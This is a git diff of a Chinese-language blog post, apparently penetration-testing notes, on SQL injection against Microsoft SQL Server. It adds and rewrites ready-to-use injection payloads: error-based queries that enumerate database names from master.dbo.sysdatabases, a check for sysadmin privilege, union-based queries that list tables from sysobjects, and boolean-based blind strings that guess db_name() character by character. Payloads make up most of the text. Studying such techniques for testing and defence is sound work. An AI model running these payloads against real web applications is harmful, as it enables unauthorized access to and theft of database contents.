@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2018-09-04 10:45:01
- * @LastEditTime: 2019-12-11 13:15:09
+ * @LastEditTime: 2019-12-11 13:28:22
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -46,7 +46,7 @@ ORIGINAL_LOGIN();
 ```
 and 1=1/and 1=2
 ```
-```
+```sql
 select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end);
 
 select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);
@@ -54,7 +54,7 @@ select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);
 
 * 判断是否为sa权限
 
-```
+```sql
 select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));
 ```
 
@@ -62,21 +62,30 @@ select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysa
 
 * 得到所有数据库名字
 ![75](/img/post/20180904-110306.png)
+
+```sql
+--得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
+id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=7);
+id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=8);
+
+--通过 not in 依次得到数据库名
+id=1 and 0<>(select top 1 name from master.dbo.sysdatabases where dbid>6 and name not in (select top 1 name from master.dbo.sysdatabases where dbid>6))
+id=1 and 0<>(select top 1 name from master.dbo.sysdatabases where dbid>6 and name not in (select top 2 name from master.dbo.sysdatabases where dbid>6))
 ```
---报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
-select id,name from msg where id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=7);
-```
+
 ![75](/img/post/20180904-151240.png)
 
 * 得到数据库test的所有表名（用户创建的表xtype的值是U）
 ![70](/img/post/20180904-111912.png)
 
-```
+```sql
 --得到数据库test的第一张表
-select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';
+id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';
 
---得到数据库test的第二张表
-select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
+--得到数据库test的第二张表方法一
+id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
+--得到数据库test的第二张表方法二
+id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in (select top 1 name from test.dbo.sysobjects where xtype='U');
 ```
 ![80](/img/post/20180904-151551.png)
 
@@ -94,14 +103,6 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ![75](/img/post/20180904-113720.png)
 
 ### 0x02 boolean-based blind 注入
-```sql
--- 得到数据库名:
-select top 1 name from master.dbo.sysdatabases where name not in (select top 2 name from master.dbo.sysdatabases)
-
--- 得到表名:
-select top 1 name from test.dbo.sysobjects where xtype='U' and name not in (select top 1 name from test.dbo.sysobjects where xtype='U');
-```
-
 ```sql
 ?id=1 and substring(db_name(),1,1)='a' --
 ?id=1 and substring(db_name(),1,1)='b' --
